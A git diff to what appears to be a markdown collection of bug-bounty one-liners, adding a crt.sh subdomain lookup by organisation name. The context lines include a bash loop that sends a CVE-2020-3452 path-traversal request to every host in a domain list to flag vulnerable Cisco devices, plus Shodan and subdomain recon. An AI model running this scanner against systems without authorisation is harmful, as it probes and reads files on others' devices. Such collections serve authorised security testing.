@@ -35,6 +35,7 @@ shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separat
 
 ### CVE-2020-3452
 > @vict0ni
+
 ```bash
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
 ```
@@ -111,9 +112,17 @@ curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https)
 ```
 ### Get Subdomains from crt.sh
 > @vict0ni
+
 ```bash
 curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
 ```
+### Get Subdomains from crt.sh based on Org's name
+> #vict0ni
+
+```bash
+curl -s "https://crt.sh/?O=$(echo $@ | sed -e 's/\ /+/g')\&output=json" | jq -r .[].common_name | grep -v null | grep -v " " | sort -u
+```
+
 ### Find All Allocated IP ranges for ASN given an IP address
 > wains.be
 
